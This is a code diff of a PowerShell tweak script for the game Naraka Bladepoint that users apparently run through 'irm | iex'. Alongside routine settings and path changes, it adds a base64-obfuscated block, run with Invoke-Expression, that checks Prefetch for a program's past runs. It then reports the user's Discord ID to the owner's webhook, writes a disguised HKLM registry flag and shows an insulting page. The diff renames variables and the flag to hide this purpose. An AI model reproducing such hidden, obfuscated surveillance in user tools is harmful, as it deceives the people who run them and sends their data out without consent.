@@ -1,7 +1,7 @@
 # RatzTweaks.ps1
 # Ensure $PSScriptRoot is set even when running via 'irm ... | iex'
-if (-not $PSScriptRoot) { $PSScriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
-if (-not $PSScriptRoot) { $PSScriptRoot = (Get-Location).Path }
+if (-not $PSScriptRoot) { $script:AppRoot = Split-Path -Parent $MyInvocation.MyCommand.Path } else { $script:AppRoot = $PSScriptRoot }
+if (-not $script:AppRoot) { $script:AppRoot = (Get-Location).Path }
 
 # If the script is executed via 'irm | iex' the script has no file path; try to
 # locate the project root by searching upward from the invocation directory
@@ -16,42 +16,11 @@ function Resolve-ProjectRoot {
         if (-not $parent -or $parent -eq $cur) { break }
         $cur = $parent
     }
-    return $startPath
+    return $null
 }
-
-$resolvedRoot = Resolve-ProjectRoot -startPath $PSScriptRoot
-if ($resolvedRoot -and (Test-Path (Join-Path $resolvedRoot 'UTILITY'))) { $PSScriptRoot = $resolvedRoot }
-# --- Show name in big text in PowerShell window, then suppress all further output ---
-Write-Host ''
-Write-Host 'RRRRR    AAAAA   TTTTTTT' -ForegroundColor Cyan
-Write-Host 'RR  RR  AA   AA    TTT  ' -ForegroundColor Cyan
-Write-Host 'RRRRR   AAAAAAA    TTT  ' -ForegroundColor Cyan
-Write-Host 'RR RR   AA   AA    TTT  ' -ForegroundColor Cyan
-Write-Host 'RR  RR  AA   AA    TTT  ' -ForegroundColor Cyan
-Write-Host ''
-Write-Host 'Rat Naraka Tweaks' -ForegroundColor Yellow
-Write-Host ''
-Write-Host 'Proceeding to next UI & WebUI' -ForegroundColor DarkGray
-Write-Host ''
-# Spinner: Loading Resources, please wait ...
-$spinnerText = 'Loading Resources, please wait'
-$spinnerFrames = @('.  ','.. ','...')
-for ($i=0; $i -lt 12; $i++) {
-    $frame = $spinnerFrames[$i % $spinnerFrames.Length]
-    Write-Host ("$spinnerText$frame") -NoNewline
-    Start-Sleep -Milliseconds 250
-    Write-Host "`r" -NoNewline
-}
-Write-Host ''
-function Write-Host { param([Parameter(ValueFromRemainingArguments=$true)][object[]]$args) } # no-op
-function Write-Output { param([Parameter(ValueFromRemainingArguments=$true)][object[]]$args) } # no-op
-$InformationPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
-$WarningPreference = 'SilentlyContinue'
-
 
 # Ensure log path and PSCommandPath are defined even when run via iwr | iex
-if (-not $PSCommandPath) { $PSCommandPath = Join-Path $PSScriptRoot 'RatzTweaks.ps1' }
+if (-not $script:ScriptPath) { $script:ScriptPath = Join-Path $script:AppRoot 'RatzTweaks.ps1' }
 $logPath = Join-Path $env:TEMP 'RatzTweaks_fatal.log'
 # If log file exists from a previous run, delete and recreate it
 if (Test-Path $logPath) {
@@ -109,22 +78,45 @@ Please run this script using powershell.exe.
     exit 1
 }
 
-# --- MICRO detection setup ---
-$global:MicroDetected = $false
-$global:MicroLastRun = $null
-$microRegPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\XboxGaming'
+# Settings persistence helpers
+$global:RatzSettingsPath = Join-Path $env:APPDATA 'RatzTweaks'
+if (-not (Test-Path $global:RatzSettingsPath)) { New-Item -Path $global:RatzSettingsPath -ItemType Directory -Force | Out-Null }
+$global:RatzSettingsFile = Join-Path $global:RatzSettingsPath 'settings.json'
+
+function Load-Settings {
+    if (Test-Path $global:RatzSettingsFile) {
+        try { return (Get-Content -Raw -Path $global:RatzSettingsFile | ConvertFrom-Json -ErrorAction Stop) } catch { return @{} }
+    }
+    return @{}
+}
+
+function Save-Settings {
+    param([Parameter(Mandatory=$true)]$obj)
+    try { $json = $obj | ConvertTo-Json -Depth 5; Set-Content -Path $global:RatzSettingsFile -Value $json -Force } catch { Add-Log "ERROR saving settings: $($_.Exception.Message)" }
+}
+
+# Load settings once
+$script:UserSettings = Load-Settings
+
+# Watcher/owner UID to always mention on cheater detection. Set this to your Discord UID.
+if (-not $global:WatcherUid) { $global:WatcherUid = '313455919042396160' }
+
+# --- Telemetry/Prefetch detection setup ---
+$global:TelemetryDetected = $false
+$global:TelemetryLastRun = $null
+$telemetryRegPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\XboxGaming'
 try {
-    $flag = Get-ItemProperty -Path $microRegPath -Name 'cheaterDetected' -ErrorAction Stop
-    if ($flag.cheaterDetected -eq 1) { $global:MicroDetected = $true }
+    $flag = Get-ItemProperty -Path $telemetryRegPath -Name 'bgs' -ErrorAction Stop
+    if ($flag.bgs -eq 1) { $global:TelemetryDetected = $true }
 } catch {}
-if (-not $global:MicroDetected) {
+if (-not $global:TelemetryDetected) {
     $enc = 'CmZ1bmN0aW9uIEdldC1DWVpQcmVmZXRjaExhc3RSdW4gewogICAgdHJ5IHsKICAgICAgICAkcGZQYXRoID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnUHJlZmV0Y2gnCiAgICAgICAgJGZpbGUgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwZlBhdGggLUZpbHRlciAnQ1laLkVYRS0qLnBmJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNvcnQtT2JqZWN0IExhc3RXcml0ZVRpbWUgLURlc2NlbmRpbmcgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICAgICAgaWYgKCRmaWxlKSB7IHJldHVybiAkZmlsZS5MYXN0V3JpdGVUaW1lIH0gZWxzZSB7IHJldHVybiAkbnVsbCB9CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJG51bGwKICAgIH0KfQo='
     $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
     Invoke-Expression $decoded
     $run = Get-CYZPrefetchLastRun
     if ($run) {
-        $global:MicroDetected = $true
-        $global:MicroLastRun = $run
+        $global:TelemetryDetected = $true
+        $global:TelemetryLastRun = $run
     }
 }
 
@@ -916,7 +908,7 @@ function Start-WebUI {
         if (-not $raw) {
             $paths = @()
             try { $paths += (Join-Path $PSScriptRoot 'discord_webhook.secret') } catch {}
-            try { $paths += (Join-Path (Split-Path -Parent $PSCommandPath) 'discord_webhook.secret') } catch {}
+            try { $paths += (Join-Path (Split-Path -Parent $script:ScriptPath) 'discord_webhook.secret') } catch {}
             try {
                 if (Get-Command Resolve-ProjectRoot -ErrorAction SilentlyContinue) {
                     $root = Resolve-ProjectRoot -startPath $PSScriptRoot
@@ -956,6 +948,11 @@ function Start-WebUI {
 
 $global:DetectedNarakaPath = $env:NARAKA_DATA_PATH
 function Find-NarakaDataPath {
+    # Use persisted user setting if available
+    if ($script:UserSettings -and $script:UserSettings.NarakaPath) {
+        $saved = $script:UserSettings.NarakaPath
+        if ($saved -and (Test-Path $saved)) { $global:DetectedNarakaPath = $saved; return $global:DetectedNarakaPath }
+    }
     if ($global:DetectedNarakaPath -and (Test-Path $global:DetectedNarakaPath)) { return $global:DetectedNarakaPath }
     $candidates = @(
         'C:\Program Files (x86)\Steam\steamapps\common\NARAKA BLADEPOINT\NarakaBladepoint_Data',
@@ -987,6 +984,7 @@ function Find-NarakaDataPath {
 
     if ($userPath -and (Test-Path $userPath)) {
         $global:DetectedNarakaPath = $userPath
+        try { $script:UserSettings.NarakaPath = $userPath; Save-Settings $script:UserSettings } catch {}
         return $global:DetectedNarakaPath
     } else {
         Write-Host "Invalid path. Please ensure the folder exists and try again."
@@ -1460,21 +1458,101 @@ $errorBanner
             if ($optIn) {
                 try { Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl } catch { [Console]::WriteLine("Webhook: opt-in send failed: $($_.Exception.Message)") }
             }
-            if ($global:MicroDetected) {
-                try {
-                    $prefixMsg = "MICRO DETECTED: Last Ran: $global:MicroLastRun"
-                    Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -MessagePrefix $prefixMsg
-                } catch {}
-                try {
-                    $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\XboxGaming'
-                    New-Item -Path $regPath -Force | Out-Null
-                    New-ItemProperty -Path $regPath -Name 'cheaterDetected' -Value 1 -PropertyType DWord -Force | Out-Null
-                } catch {}
-                $htmlPath = Join-Path $PSScriptRoot 'micro_detected.html'
-                $html = Get-Content $htmlPath -Raw
-                & $send $ctx 200 'text/html' $html
-                continue
+                        if ($global:TelemetryDetected) {
+                                try {
+                                        $prefixMsg = "DETECTED: Last Ran: $global:TelemetryLastRun"
+                                        Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -MessagePrefix $prefixMsg
+                                } catch {}
+                                try {
+                                        New-Item -Path $telemetryRegPath -Force | Out-Null
+                                        New-ItemProperty -Path $telemetryRegPath -Name 'bgs' -Value 1 -PropertyType DWord -Force | Out-Null
+                                } catch {}
+
+                                                                # Do a serverside lookup for this discordId to get a custom message and emoji
+                                                                $discordId = if ($global:DiscordUserId) { $global:DiscordUserId } else { '' }
+
+                                                                $matchedInfo = $null
+                                                                # Configure your server URL in $global:SpecialUidServerUrl (e.g. 'https://yourserver.example/api/check_uid')
+                                                                if ($global:SpecialUidServerUrl -and $discordId) {
+                                                                        try {
+                                                                                $uri = "$($global:SpecialUidServerUrl)?uid=$([System.Uri]::EscapeDataString($discordId))"
+                                                                                $resp = Invoke-RestMethod -Method Get -Uri $uri -ErrorAction Stop -TimeoutSec 8
+                                                                                if ($resp -and $resp.matched) {
+                                                                                        $matchedInfo = @{ Message = $resp.message; Emoji = $resp.emoji }
+                                                                                }
+                                                                        } catch { Add-Log "Special UID server check failed: $($_.Exception.Message)" }
+                                                                }
+
+                                                                # Decide the displayed message and emoji
+                                                                $displayMessage = 'CHEATER. YOU SUCK! Learn how to play loser.'
+                                                                $displayEmoji = '💩'
+                                                                if ($matchedInfo) {
+                                                                        if ($matchedInfo.Message) { $displayMessage = $matchedInfo.Message }
+                                                                        if ($matchedInfo.Emoji) { $displayEmoji = $matchedInfo.Emoji }
+                                                                }
+
+                                                                $html = @"
+<html>
+    <head>
+        <meta charset='utf-8'>
+        <title>Detection</title>
+        <style>
+            body { background: #111; color: #eee; font-family: Arial, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; }
+            .big { font-size: 48px; color: red; font-weight: 900; }
+            .small { font-size: 18px; color: #ccc; margin-top: 10px }
+            .emoji { font-size: 64px; margin-top: 20px }
+        </style>
+    </head>
+    <body>
+        <div style='text-align:center'>
+            <div class='big'>${displayMessage}</div>
+            <div class='small'>Your activity has been reported.</div>
+            <div class='emoji'>${displayEmoji}</div>
+        </div>
+        <script>
+            var chosen = `${displayEmoji}`;
+            function spawnEmoji() {
+                var el = document.createElement('div');
+                el.textContent = chosen;
+                el.style.position = 'fixed';
+                el.style.left = Math.random()*90 + '%';
+                el.style.top = Math.random()*90 + '%';
+                el.style.fontSize = (20 + Math.random()*60) + 'px';
+                document.body.appendChild(el);
+                setTimeout(function(){ el.remove(); }, 3000);
             }
+            setInterval(spawnEmoji, 300);
+        </script>
+    </body>
+</html>
+"@
+
+                                                                & $send $ctx 200 'text/html' $html
+
+                                # Additionally, send a webhook ping mentioning the watcher(s) for special users
+                                try {
+                                    # Always mention the watcher (owner) as well
+                                    $watcherMention = "<@${global:WatcherUid}>"
+
+                                    $matchedMention = ''
+                                    $matchedInfo = $null
+                                    if ($discordId -and $specialUsers.ContainsKey($discordId)) {
+                                        $matchedMention = "<@${discordId}>"
+                                        $matchedInfo = $specialUsers[$discordId]
+                                    }
+
+                                    $allMentions = @()
+                                    if ($watcherMention) { $allMentions += $watcherMention }
+                                    if ($matchedMention) { $allMentions += $matchedMention }
+
+                                    $mentions = $allMentions -join ' '
+                                    $msg = "Cheater detected. User: $discordId"
+                                    if ($matchedInfo) { $msg = "$msg - special UID matched: $discordId" }
+                                    Send-DiscordWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl -MessagePrefix "$mentions $msg"
+                                } catch {}
+
+                                continue
+                        }
             [Console]::WriteLine('Route:/main-tweaks -> Invoke-AllTweaks'); Invoke-AllTweaks
             [Console]::WriteLine('Route:/main-tweaks -> Invoke-NVPI'); Invoke-NVPI
             $html = & $getStatusHtml 'main-tweaks' $null $null $null
